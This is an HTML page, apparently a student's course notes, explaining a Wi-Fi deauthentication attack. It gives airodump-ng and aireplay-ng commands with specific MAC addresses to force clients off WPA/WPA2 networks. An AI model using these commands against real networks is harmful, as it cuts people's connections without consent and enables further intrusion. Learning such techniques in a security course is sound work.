@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body{
+            height: 100%;
+            width: 100%;
+            background: #f5f6fa;
+        }
+        div{
+            color: #67727e;
+            font-size: 20px;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+        5..19 <br><br>
+        Deauthentication attack <br><br>
+        Disconnect any client from any network<br>
+        1. Works on encrypted networks (WEP, WPA & WPA2<br>
+        2. No need to know the network key<br>
+        3. No need to connect to the network<br><br>
+        
+        To deauthenticate a computer or station from bssid we make a deauthentication attack<br>
+        
+        airodump-ng - - bssid F8:23:B2:B9:50:A8 - - channel 2  mon0<br>
+        
+        It will give me station<br>
+        
+        Before hitting this command to deauthenticate<br><br>
+        
+        aireplay-ng  - - deauth 100000000 -a  F8:23:B2:B9:50:A8(bssid) -c 80:E6:50:22:A2:E8 (station) mon0<br>
+        
+        If your network is more than 5ghz then after station we have to use -D and then space and then mon0(which is my wireless adapter name)<br>
+
+    </div>
+</body>
+
+</html>
